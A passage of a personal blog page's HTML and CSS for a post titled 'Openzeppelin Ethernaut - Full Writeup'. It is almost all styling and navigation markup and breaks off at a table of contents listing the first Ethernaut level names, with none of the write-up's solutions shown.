dotted;}b,strong{font-weight:bold;}small{font-size:80%;}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline;}sub{bottom:-0.25em;}sup{top:-0.5em;}img{border-style:none;}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0;}button,input{overflow:visible;}button,select{text-transform:none;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0;}fieldset{padding:0.35em 0.75em 0.625em;}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal;}progress{vertical-align:baseline;}textarea{overflow:auto;}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0;}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{-webkit-appearance:none!important;}input[type="number"]{-moz-appearance:textfield;}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px;}[type="search"]::-webkit-search-decoration{-webkit-appearance:none!important;}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit;}details{display:block;}summary{display:-webkit-box;display:-webkit-list-item;display:-ms-list-itembox;display:list-item;}template{display:none;}[hidden]{display:none!important;}body,blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0;}button{background:transparent;padding:0;}fieldset{margin:0;padding:0;}ol,ul{margin:0;padding:0;}textarea{resize:vertical;}button,[role="button"]{cursor:pointer;}button::-moz-focus-inner{border:0!important;}table{border-collapse:collapse;}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit;}button,input,optgroup,select,textarea{padding:0;line-height:inherit;color:inherit;}img,svg,video,canvas,audio,iframe,embed,object{display:block;}img,video{max-width:100%;height:auto;}[data-js-focus-visible] :focus:not([data-focus-visible-added]){outline:none;box-shadow:none;}select::-ms-expand{display:none;}</style><style data-emotion="css-global 4j7nz">body{font-family:var(--chakra-fonts-body);color:var(--chakra-colors-lightSecondary);background:var(--chakra-colors-lightBackground);transition-property:background-color;transition-duration:var(--chakra-transition-duration-normal);line-height:var(--chakra-lineHeights-base);}*::-webkit-input-placeholder{color:var(--chakra-colors-gray-400);}*::-moz-placeholder{color:var(--chakra-colors-gray-400);}*:-ms-input-placeholder{color:var(--chakra-colors-gray-400);}*::placeholder{color:var(--chakra-colors-gray-400);}*,*::before,::after{border-color:var(--chakra-colors-gray-200);word-wrap:break-word;}</style><style data-emotion="css 29kohe">.css-29kohe{display:grid;grid-column-gap:var(--chakra-space-1);grid-template-columns:repeat(6,1fr);z-index:var(--chakra-zIndices-banner);position:fixed;left:0px;top:0px;background-color:var(--chakra-colors-lightBackground);height:8vh;min-height:100px;width:var(--chakra-sizes-full);padding-left:var(--chakra-space-2);-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}@media screen and (min-width: 30em){.css-29kohe{grid-column-gap:var(--chakra-space-1);grid-template-columns:repeat(6,1fr);padding-left:var(--chakra-space-2);}}@media screen and (min-width: 48em){.css-29kohe{grid-column-gap:var(--chakra-space-2);grid-template-columns:repeat(6,1fr);padding-left:var(--chakra-space-4);}}@media screen and (min-width: 62em){.css-29kohe{grid-column-gap:var(--chakra-space-4);grid-template-columns:repeat(12,1fr);padding-left:var(--chakra-space-8);}}</style><div id="navbar-container" class="css-29kohe"><div class="navbar-header" id="navbar-header-container" style="opacity:0;transform:translateX(-20px) translateZ(0)"><style data-emotion="css 182iy1o">.css-182iy1o{font-family:var(--chakra-fonts-display);font-weight:var(--chakra-fontWeights-thin);font-size:var(--chakra-fontSizes-xl);line-height:1.33;cursor:pointer;padding-left:var(--chakra-space-1);text-align:center;}@media screen and (min-width: 30em){.css-182iy1o{font-size:var(--chakra-fontSizes-3xl);padding-left:var(--chakra-space-2);text-align:center;}}@media screen and (min-width: 48em){.css-182iy1o{font-size:var(--chakra-fontSizes-4xl);line-height:1.2;padding-left:0px;text-align:center;}}@media screen and (min-width: 62em){.css-182iy1o{font-size:var(--chakra-fontSizes-4xl);text-align:left;}}@media screen and (min-width: 80em){.css-182iy1o{font-size:var(--chakra-fontSizes-5xl);}}.css-182iy1o:hover,.css-182iy1o[data-hover]{color:var(--chakra-colors-lightSecondary);opacity:0.7;}</style><h2 class="chakra-heading css-182iy1o" id="navbar-header">Yassine Belkhadem</h2></div><style data-emotion="css 5w50zu">.css-5w50zu{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;overflow:visible;z-index:2;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-lightBackground);grid-column-start:3;grid-column-end:6;height:var(--chakra-sizes-full);width:var(--chakra-sizes-full);border-top:0;}@media screen and (min-width: 30em){.css-5w50zu{grid-column-start:3;grid-column-end:6;}}@media screen and (min-width: 48em){.css-5w50zu{grid-column-start:3;grid-column-end:6;}}@media screen and (min-width: 62em){.css-5w50zu{grid-column-start:6;grid-column-end:9;}}</style><div id="dropdown-menu-container" class="css-5w50zu"><style data-emotion="css z26yqd">.css-z26yqd{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-lightBackground);width:var(--chakra-sizes-full);border-radius:2px;top:0px;position:absolute;z-index:2;padding-top:40px;border:0.4px solid;border-color:var(--chakra-colors-darkBackground);border-top:0;border-width:0;padding-bottom:0px;}.css-z26yqd>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-z26yqd" id="dropdown-menu"><div id="dropdown-menu-list" style="opacity:0;transform:scale(0.4) translateZ(0)"><style data-emotion="css 1elkzvy">.css-1elkzvy{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none;appearance:none;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;white-space:nowrap;vertical-align:middle;outline:2px solid transparent;outline-offset:2px;width:auto;line-height:1.2;border-radius:999999px;font-weight:var(--chakra-fontWeights-semibold);transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-normal);height:var(--chakra-sizes-10);min-width:40px;font-size:var(--chakra-fontSizes-md);-webkit-padding-start:var(--chakra-space-4);padding-inline-start:var(--chakra-space-4);-webkit-padding-end:var(--chakra-space-4);padding-inline-end:var(--chakra-space-4);background:var(--chakra-colors-gray-100);padding:1.3125px;--chakra-scale-x:0.7;--chakra-scale-y:0.7;min-height:40px;background-color:var(--chakra-colors-lightBackground);border:0.4px solid;border-color:var(--chakra-colors-darkBackground);color:inherit;}.css-1elkzvy:focus,.css-1elkzvy[data-focus]{box-shadow:var(--chakra-shadows-outline);}.css-1elkzvy[disabled],.css-1elkzvy[aria-disabled=true],.css-1elkzvy[data-disabled]{opacity:0.4;cursor:not-allowed;box-shadow:var(--chakra-shadows-none);}.css-1elkzvy:hover,.css-1elkzvy[data-hover]{background:var(--chakra-colors-gray-200);}.css-1elkzvy:hover[disabled],.css-1elkzvy[data-hover][disabled],.css-1elkzvy:hover[aria-disabled=true],.css-1elkzvy[data-hover][aria-disabled=true],.css-1elkzvy:hover[data-disabled],.css-1elkzvy[data-hover][data-disabled]{background:var(--chakra-colors-gray-100);}@media screen and (min-width: 30em){.css-1elkzvy{min-width:45px;min-height:45px;}}@media screen and (min-width: 48em){.css-1elkzvy{min-width:45px;min-height:45px;}}@media screen and (min-width: 62em){.css-1elkzvy{min-width:50px;min-height:50px;}}.css-1elkzvy:active,.css-1elkzvy[data-active]{background:var(--chakra-colors-gray-300);}</style><button type="button" class="chakra-button css-1elkzvy" aria-label="Dropdown button"><svg color="lightBackground" xmlns="http://www.w3.org/2000/svg" height="30" width="30" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg></button></div><div class="chakra-collapse" style="overflow:hidden;display:none;opacity:0;height:0px"><style data-emotion="css 1xzsyzi">.css-1xzsyzi{height:10px;}</style><div class="css-1xzsyzi"></div><style data-emotion="css a8dr2z">.css-a8dr2z{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-lightBackground);}.css-a8dr2z>*:not(style)~*:not(style){margin-top:var(--chakra-space-8);-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-a8dr2z" id="dropdown-menu-items"><div style="height:100%;opacity:0;transform:translateY(-10px) translateZ(0)"><style data-emotion="css oxy0a5">.css-oxy0a5{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;height:50px;font-family:Inversionz Unboxed;font-size:var(--chakra-fontSizes-2xl);}.css-oxy0a5:hover,.css-oxy0a5[data-hover]{-webkit-text-decoration:underline;text-decoration:underline;}.css-oxy0a5:focus,.css-oxy0a5[data-focus]{box-shadow:var(--chakra-shadows-outline);}@media screen and (min-width: 30em){.css-oxy0a5{font-size:var(--chakra-fontSizes-2xl);}}@media screen and (min-width: 48em){.css-oxy0a5{font-size:var(--chakra-fontSizes-4xl);}}</style><a class="chakra-link css-oxy0a5" href="/">Portfolio</a></div><div style="height:100%;opacity:0;transform:translateY(-10px) translateZ(0)"><a class="chakra-link css-oxy0a5" href="/blog">Blog</a></div></div></div></div></div><style data-emotion="css 1ciw33x">.css-1ciw33x{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none;appearance:none;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;white-space:nowrap;vertical-align:middle;outline:2px solid transparent;outline-offset:2px;width:auto;line-height:1.2;border-radius:1px;font-weight:var(--chakra-fontWeights-semibold);transition-property:var(--chakra-transition-property-common);transition-duration:500ms;height:var(--chakra-sizes-full);min-width:var(--chakra-sizes-10);font-size:var(--chakra-fontSizes-md);-webkit-padding-start:var(--chakra-space-4);padding-inline-start:var(--chakra-space-4);-webkit-padding-end:var(--chakra-space-4);padding-inline-end:var(--chakra-space-4);background:var(--chakra-colors-gray-100);padding:0px;-webkit-transition:all;transition:all;grid-column-start:6;background-color:var(--chakra-colors-lightBackground);}.css-1ciw33x:focus,.css-1ciw33x[data-focus]{box-shadow:var(--chakra-shadows-outline);}.css-1ciw33x[disabled],.css-1ciw33x[aria-disabled=true],.css-1ciw33x[data-disabled]{opacity:0.4;cursor:not-allowed;box-shadow:var(--chakra-shadows-none);}.css-1ciw33x:hover,.css-1ciw33x[data-hover]{background-color:var(--chakra-colors-darkBackground);color:var(--chakra-colors-lightBackground);height:var(--chakra-sizes-full);}.css-1ciw33x:active,.css-1ciw33x[data-active]{background:var(--chakra-colors-gray-300);}@media screen and (min-width: 30em){.css-1ciw33x{grid-column-start:6;}}@media screen and (min-width: 48em){.css-1ciw33x{grid-column-start:6;}}@media screen and (min-width: 62em){.css-1ciw33x{grid-column-start:12;}}</style><button type="button" class="chakra-button css-1ciw33x" aria-label="theme switcher"><svg height="35" width="35" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg></button></div><style data-emotion="css dh3o7u">.css-dh3o7u{display:none;z-index:var(--chakra-zIndices-banner);position:fixed;right:var(--chakra-space-5);top:20%;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}@media screen and (min-width: 30em){.css-dh3o7u{display:none;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}}@media screen and (min-width: 48em){.css-dh3o7u{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}}@media screen and (min-width: 62em){.css-dh3o7u{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}}</style><div spacing="1" class="css-dh3o7u"><style data-emotion="css 1syov5e">.css-1syov5e{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;}.css-1syov5e:hover,.css-1syov5e[data-hover]{color:var(--chakra-colors-lightBackground);background-color:var(--chakra-colors-lightSecondary);}.css-1syov5e:focus,.css-1syov5e[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-1syov5e" href="https://www.facebook.com/yassine.belkhadm/"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="50" width="50" xmlns="http://www.w3.org/2000/svg"><path d="M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-32 736H663.9V602.2h104l15.6-120.7H663.9v-77.1c0-35 9.7-58.8 59.8-58.8h63.9v-108c-11.1-1.5-49-4.8-93.2-4.8-92.2 0-155.3 56.3-155.3 159.6v89H434.9v120.7h104.3V848H176V176h672v672z"></path></svg></a><a class="chakra-link css-1syov5e" href="https://www.linkedin.com/in/yassine-belkhadem-396266204/"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="50" width="50" xmlns="http://www.w3.org/2000/svg"><path d="M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zM349.3 793.7H230.6V411.9h118.7v381.8zm-59.3-434a68.8 68.8 0 1 1 68.8-68.8c-.1 38-30.9 68.8-68.8 68.8zm503.7 434H675.1V608c0-44.3-.8-101.2-61.7-101.2-61.7 0-71.2 48.2-71.2 98v188.9H423.7V411.9h113.8v52.2h1.6c15.8-30 54.5-61.7 112.3-61.7 120.2 0 142.3 79.1 142.3 181.9v209.4z"></path></svg></a><style data-emotion="css j0ra30">.css-j0ra30{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;padding:var(--chakra-space-1);background-color:var(--chakra-colors-lightSecondary);}.css-j0ra30:hover,.css-j0ra30[data-hover]{color:var(--chakra-colors-lightBackground);background-color:var(--chakra-colors-lightBackground);}.css-j0ra30:focus,.css-j0ra30[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-j0ra30" href="/assets/YassineBelkhademCV.pdf"><svg width="30" height="30" viewBox="0 0 61 44" fill="none" xmlns="http://www.w3.org/2000/svg"><rect width="61" height="43" transform="translate(0 0.5)" fill="white"></rect><path d="M26.2354 20.0312C26.2354 18.8594 26.1084 17.9316 25.8545 17.248C25.6006 16.5645 25.1807 16.0469 24.5947 15.6953C24.0088 15.3438 23.2373 15.1191 22.2803 15.0215C21.333 14.9238 20.1562 14.875 18.75 14.875H12.1729C10.9229 14.875 9.86816 14.9141 9.00879 14.9922C8.15918 15.0605 7.45605 15.207 6.89941 15.4316C6.34277 15.6562 5.91309 15.9785 5.61035 16.3984C5.30762 16.8184 5.08789 17.375 4.95117 18.0684C4.81445 18.7617 4.73633 19.6162 4.7168 20.6318C4.69727 21.6377 4.6875 22.8438 4.6875 24.25C4.6875 25.6562 4.69727 26.8672 4.7168 27.8828C4.74609 28.8887 4.8291 29.7383 4.96582 30.4316C5.10254 31.125 5.31738 31.6816 5.61035 32.1016C5.91309 32.5215 6.34277 32.8438 6.89941 33.0684C7.45605 33.293 8.15918 33.4443 9.00879 33.5225C9.86816 33.5908 10.9229 33.625 12.1729 33.625H18.75C19.8438 33.625 20.7861 33.5957 21.5771 33.5371C22.3682 33.4785 23.042 33.3711 23.5986 33.2148C24.1553 33.0586 24.6045 32.8438 24.9463 32.5703C25.2881 32.2969 25.5518 31.9551 25.7373 31.5449C25.9326 31.125 26.0645 30.627 26.1328 30.0508C26.2012 29.4648 26.2354 28.7812 26.2354 28H29.0479C29.0479 28.9375 28.9893 29.7871 28.8721 30.5488C28.7549 31.3008 28.5449 31.9746 28.2422 32.5703C27.9492 33.1562 27.5537 33.6641 27.0557 34.0938C26.5576 34.5234 25.9277 34.8799 25.166 35.1631C24.4043 35.4365 23.4961 35.6367 22.4414 35.7637C21.3867 35.9004 20.1562 35.9688 18.75 35.9688H12.1729C10.4541 35.9688 9.00391 35.8613 7.82227 35.6465C6.65039 35.4414 5.68359 35.1289 4.92188 34.709C4.16016 34.2793 3.56934 33.7422 3.14941 33.0977C2.73926 32.4531 2.43652 31.6963 2.24121 30.8271C2.05566 29.958 1.94824 28.9766 1.91895 27.8828C1.88965 26.7891 1.875 25.5781 1.875 24.25C1.875 22.9219 1.88965 21.7109 1.91895 20.6172C1.94824 19.5234 2.05566 18.542 2.24121 17.6729C2.43652 16.8037 2.73926 16.0469 3.14941 15.4023C3.56934 14.7578 4.16016 14.2256 4.92188 13.8057C5.68359 13.376 6.65039 13.0586 7.82227 12.8535C9.00391 12.6387 10.4541 12.5312 12.1729 12.5312H18.75C20.1562 12.5312 21.3867 12.5996 22.4414 12.7363C23.4961 12.8633 24.4043 13.0635 25.166 13.3369C25.9277 13.6006 26.5576 13.9375 27.0557 14.3477C27.5537 14.7578 27.9492 15.2412 28.2422 15.7979C28.5449 16.3545 28.7549 16.9844 28.8721 17.6875C28.9893 18.3906 29.0479 19.1719 29.0479 20.0312H26.2354ZM56.7188 13H60L47.8125 35.5H44.0625L31.875 13H35.1562L45.9375 33.625L56.7188 13Z" fill="#16222A"></path></svg></a></div><style data-emotion="css vdrwix">.css-vdrwix{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;height:var(--chakra-sizes-full);overflow-y:scroll;overflow-x:hidden;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;z-index:var(--chakra-zIndices-base);position:relative;}</style><div class="css-vdrwix"><style data-emotion="css 148e81f">.css-148e81f{min-height:100px;height:16vh;}</style><div id="navbar-placeholder" class="css-148e81f"></div><style data-emotion="css 14dh39v">.css-14dh39v{margin-left:10%;}</style><div href="/blog" class="css-14dh39v"><style data-emotion="css 1n5thfy">.css-1n5thfy{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}.css-1n5thfy:hover,.css-1n5thfy[data-hover]{-webkit-text-decoration:underline;text-decoration:underline;}.css-1n5thfy:focus,.css-1n5thfy[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-1n5thfy"><style data-emotion="css onkibi">.css-onkibi{width:1em;height:1em;display:inline-block;line-height:1em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;color:currentColor;vertical-align:middle;}</style><svg viewBox="0 0 24 24" focusable="false" class="chakra-icon css-onkibi"><path fill="currentColor" d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"></path></svg><style data-emotion="css w9j3m0">.css-w9j3m0{margin-left:var(--chakra-space-2);font-size:var(--chakra-fontSizes-2xl);font-weight:var(--chakra-fontWeights-bold);}</style><p class="chakra-text css-w9j3m0"> <!-- -->Go Back</p></a></div><style data-emotion="css 1isl2s1">.css-1isl2s1{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;position:relative;max-width:1300px;-webkit-margin-start:4px;margin-inline-start:4px;-webkit-margin-end:4px;margin-inline-end:4px;}.css-1isl2s1>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}@media screen and (min-width: 30em){.css-1isl2s1{-webkit-margin-start:4px;margin-inline-start:4px;-webkit-margin-end:4px;margin-inline-end:4px;}}@media screen and (min-width: 48em){.css-1isl2s1{-webkit-margin-start:4px;margin-inline-start:4px;-webkit-margin-end:4px;margin-inline-end:4px;}}@media screen and (min-width: 62em){.css-1isl2s1{-webkit-margin-start:auto;margin-inline-start:auto;-webkit-margin-end:auto;margin-inline-end:auto;}}</style><div class="chakra-stack css-1isl2s1"><style data-emotion="css cf3ii7">.css-cf3ii7{font-family:var(--chakra-fonts-heading);font-weight:var(--chakra-fontWeights-bold);font-size:var(--chakra-fontSizes-3xl);line-height:1.33;color:#536073;text-align:center;}@media screen and (min-width: 30em){.css-cf3ii7{font-size:var(--chakra-fontSizes-4xl);}}@media screen and (min-width: 48em){.css-cf3ii7{font-size:var(--chakra-fontSizes-6xl);line-height:1.2;}}@media screen and (min-width: 62em){.css-cf3ii7{font-size:var(--chakra-fontSizes-7xl);}}</style><h2 class="chakra-heading css-cf3ii7">Openzeppelin Ethernaut - Full Writeup</h2><style data-emotion="css 1sd0gdo">.css-1sd0gdo{color:var(--chakra-colors-lightSecondary);}</style><p class="chakra-text css-1sd0gdo">2022-07-27</p><style data-emotion="css uxb30m">.css-uxb30m{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.css-uxb30m>*:not(style)~*:not(style){margin-top:0px;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0.5rem;margin-inline-start:0.5rem;}</style><div class="chakra-stack css-uxb30m"><style data-emotion="css d1mco7">.css-d1mco7{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;vertical-align:top;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;max-width:100%;font-weight:var(--chakra-fontWeights-medium);line-height:1.2;outline:2px solid transparent;outline-offset:2px;min-height:1.5rem;min-width:1.5rem;font-size:var(--chakra-fontSizes-md);border-radius:var(--chakra-radii-md);-webkit-padding-start:var(--chakra-space-2);padding-inline-start:var(--chakra-space-2);-webkit-padding-end:var(--chakra-space-2);padding-inline-end:var(--chakra-space-2);background:var(--chakra-colors-gray-100);color:var(--chakra-colors-lightBackground);background-color:var(--chakra-colors-cardDark2);-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.css-d1mco7:focus,.css-d1mco7[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><span class="css-d1mco7">Cybersecurtiy</span><span class="css-d1mco7">Writeups</span><span class="css-d1mco7">Smart Contract Security</span><span class="css-d1mco7">CTF</span><span class="css-d1mco7">Ethereum</span><span class="css-d1mco7">Blockchain</span></div><style data-emotion="css xgff9b">.css-xgff9b{height:32px;}</style><div class="css-xgff9b"></div><style data-emotion="css p1kl7j">.css-p1kl7j{border-radius:2px;box-shadow:var(--chakra-shadows-md);-webkit-padding-start:var(--chakra-space-8);padding-inline-start:var(--chakra-space-8);-webkit-padding-end:var(--chakra-space-8);padding-inline-end:var(--chakra-space-8);}@media screen and (min-width: 30em){.css-p1kl7j{-webkit-padding-start:var(--chakra-space-8);padding-inline-start:var(--chakra-space-8);-webkit-padding-end:var(--chakra-space-8);padding-inline-end:var(--chakra-space-8);}}@media screen and (min-width: 48em){.css-p1kl7j{-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}}@media screen and (min-width: 62em){.css-p1kl7j{-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}}</style><div class="css-p1kl7j"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271200%27%20height=%27900%27/%3e"/></span><img alt="Openzeppelin Ethernaut - Full Writeup cover image" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="Openzeppelin Ethernaut - Full Writeup cover image" src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659139050/large_openzeppelin_ethernaut_c431a176dd.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><style data-emotion="css wzua3q">.css-wzua3q{opacity:0.6;border:0;border-color:inherit;border-style:solid;border-bottom-width:1px;width:100%;max-width:1200px;margin-top:var(--chakra-space-12);margin-bottom:var(--chakra-space-12);}</style><hr aria-orientation="horizontal" class="chakra-divider css-wzua3q"/><style data-emotion="css pr1uvm">.css-pr1uvm{width:100%;max-width:1300px;-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}@media screen and (min-width: 30em){.css-pr1uvm{-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}}@media screen and (min-width: 48em){.css-pr1uvm{-webkit-padding-start:var(--chakra-space-12);padding-inline-start:var(--chakra-space-12);-webkit-padding-end:var(--chakra-space-12);padding-inline-end:var(--chakra-space-12);}}@media screen and (min-width: 62em){.css-pr1uvm{-webkit-padding-start:var(--chakra-space-12);padding-inline-start:var(--chakra-space-12);-webkit-padding-end:var(--chakra-space-12);padding-inline-end:var(--chakra-space-12);}}</style><div class="blogPost css-pr1uvm"><style data-emotion="css 1yzq3sl">.css-1yzq3sl{font-family:var(--chakra-fonts-heading);font-weight:var(--chakra-fontWeights-bold);font-size:48px;line-height:1.33;color:#B17BBA;margin-top:var(--chakra-space-14);margin-bottom:var(--chakra-space-10);}@media screen and (min-width: 48em){.css-1yzq3sl{line-height:1.2;}}</style><h1 class="chakra-heading css-1yzq3sl">Ethernaut Full Writeup</h1>
<ul>
<li><style data-emotion="css 9olwc6">.css-9olwc6{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:var(--chakra-colors-orange-400);font-weight:700;}.css-9olwc6:hover,.css-9olwc6[data-hover]{-webkit-text-decoration:underline;text-decoration:underline;}.css-9olwc6:focus,.css-9olwc6[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-9olwc6" href="#ethernaut-full-writeup">Ethernaut Full Writeup</a>
<ul>
<li><a class="chakra-link css-9olwc6" href="#hello-ethernaut">Hello Ethernaut</a></li>
<li><a class="chakra-link css-9olwc6" href="#fallback">Fallback</a></li>
<li><a class="chakra-link css-9olwc6" href="#fallout">Fallout</a></li>
<li><a class="chakra-link css-9olwc6" href="#coinflip">CoinFlip</a></li>
<li><a class="chakra-link css-9olwc6" href="#telephone">Telephone</a></li>
<li><a class="chakra-link css-9olwc6" href="#token">Token</a></li>
<li><a class="chakra-link css-9olwc6" href="#delegation">Delegation</a></li>
